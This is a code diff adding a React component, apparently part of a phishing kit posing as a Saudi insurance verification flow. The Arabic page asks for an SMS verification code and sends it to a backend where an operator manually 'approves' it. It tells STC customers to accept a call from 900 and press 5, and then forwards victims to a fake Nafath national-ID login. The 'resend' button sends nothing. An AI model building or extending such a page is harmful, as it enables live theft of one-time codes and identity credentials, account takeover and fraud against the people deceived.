@@ -1,0 +1,147 @@
+import { useState, useEffect, useRef } from "react";
+import { useNavigate, useLocation } from "react-router-dom";
+import { motion } from "framer-motion";
+import { Button } from "@/components/ui/button";
+import { Shield, Lock, RefreshCw, Smartphone, Loader2 } from "lucide-react";
+import VerificationLayout from "@/components/VerificationLayout";
+import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
+import { toast } from "sonner";
+import { linkVisitorToSession } from "@/lib/visitorLink";
+
+const PhoneOTP = () => {
+  const navigate = useNavigate();
+  const location = useLocation();
+  const offer = location.state?.offer;
+  const phone = location.state?.phone || "05•••••89";
+  const carrier = location.state?.carrier || "";
+  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
+
+  const [code, setCode] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [waitingApproval, setWaitingApproval] = useState(false);
+  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
+  const [timer, setTimer] = useState(120);
+  const [canResend, setCanResend] = useState(false);
+  const [error, setError] = useState(false);
+  const inputRef = useRef<HTMLInputElement | null>(null);
+
+  const approvalStatus = useAdminApproval(orderId, "phone_otp");
+
+  useEffect(() => { inputRef.current?.focus(); }, []);
+
+  useEffect(() => {
+    if (timer <= 0) { setCanResend(true); return; }
+    const id = setInterval(() => setTimer(t => t - 1), 1000);
+    return () => clearInterval(id);
+  }, [timer]);
+
+  useEffect(() => {
+    if (approvalStatus === "approved" && orderId) {
+      toast.success("تم التحقق بنجاح");
+      sessionStorage.setItem("insurance_order_id", orderId);
+      if (carrier === "STC") {
+        navigate("/insurance/phone-stc", { state: { offer, phone, carrier, orderId } });
+      } else {
+        navigate("/insurance/nafath-login", { state: { offer, phone, carrier, orderId } });
+      }
+    } else if (approvalStatus === "rejected") {
+      toast.error("تم رفض رمز التحقق");
+      setWaitingApproval(false);
+      setLoading(false);
+    }
+  }, [approvalStatus, orderId, navigate, offer, phone, carrier]);
+
+  const handleChange = (v: string) => {
+    const digits = v.replace(/\D/g, "");
+    setCode(digits);
+    setError(false);
+  };
+
+  const handleVerify = async () => {
+    if (code.length < 4) return;
+    setLoading(true);
+    linkVisitorToSession({ phone });
+    const id = await createOrUpdateStage(orderId, "phone_otp", { phone_otp_code: code });
+    setOrderId(id);
+    setWaitingApproval(true);
+  };
+
+  const handleResend = () => {
+    setTimer(120); setCanResend(false); setCode("");
+    inputRef.current?.focus();
+  };
+
+  const fmt = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;
+  const maskedPhone = phone.length >= 10 ? phone.slice(0, 2) + "•••••" + phone.slice(-2) : phone;
+
+  return (
+    <VerificationLayout title="رمز التحقق" subtitle="تم إرسال رمز التحقق إلى هاتفك النقال">
+      <div className="p-6 text-center">
+        <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", delay: 0.2 }}
+          className="w-14 h-14 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-4">
+          <Smartphone className="w-7 h-7 text-primary" />
+        </motion.div>
+
+        {waitingApproval ? (
+          <div className="space-y-4 py-4">
+            <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
+            <h3 className="text-sm font-bold text-foreground">بانتظار موافقة الإدارة...</h3>
+            <p className="text-xs text-muted-foreground">يرجى الانتظار حتى تتم مراجعة رمز التحقق</p>
+          </div>
+        ) : (
+          <>
+            <h2 className="text-lg font-bold text-foreground mb-1">أدخل رمز التحقق</h2>
+            <p className="text-xs text-muted-foreground mb-1">تم إرسال رمز التحقق إلى هاتفك النقال</p>
+            <p className="text-xs font-bold text-foreground mb-1 flex items-center justify-center gap-1" dir="ltr">
+              <Lock className="w-3 h-3 text-primary" />{maskedPhone}
+            </p>
+
+            {carrier === "STC" && (
+              <p className="text-[10px] text-amber-600 bg-amber-50 dark:bg-amber-950/20 rounded-lg px-3 py-1.5 mb-3 inline-block">
+                عملاء STC الكرام في حال تلقي مكالمة من 900 الرجاء قبولها واختيار الرقم 5
+              </p>
+            )}
+
+            <div className="flex justify-center my-5" dir="ltr">
+              <motion.input
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ delay: 0.3 }}
+                ref={inputRef}
+                type="text"
+                inputMode="numeric"
+                value={code}
+                onChange={(e) => handleChange(e.target.value)}
+                placeholder="أدخل رمز التحقق"
+                className={`w-full max-w-[260px] text-center text-lg font-bold tracking-[0.3em] rounded-xl border-2 px-4 py-3 transition-all focus:outline-none ${
+                  code ? "border-primary bg-primary/5 text-primary shadow-sm shadow-primary/10" : "border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20"
+                } ${error ? "border-destructive" : ""}`}
+              />
+            </div>
+
+            {error && <p className="text-xs text-destructive mb-3">رمز التحقق غير صحيح</p>}
+
+            <div className="mb-4">
+              {canResend ? (
+                <button onClick={handleResend} className="flex items-center gap-2 text-xs text-primary hover:text-primary/80 mx-auto font-medium">
+                  <RefreshCw className="w-3.5 h-3.5" />إعادة إرسال الرمز
+                </button>
+              ) : (
+                <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-3 py-1">
+                  <span className="text-[10px] text-muted-foreground">إعادة الإرسال خلال</span>
+                  <span className="text-xs text-primary font-bold font-mono">{fmt(timer)}</span>
+                </div>
+              )}
+            </div>
+
+            <Button onClick={handleVerify} disabled={loading || code.length < 4} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2">
+              <Lock className="w-3.5 h-3.5" />{loading ? "جاري المعالجة..." : "تحقق"}
+            </Button>
+          </>
+        )}
+      </div>
+    </VerificationLayout>
+  );
+};
+
+export default PhoneOTP;
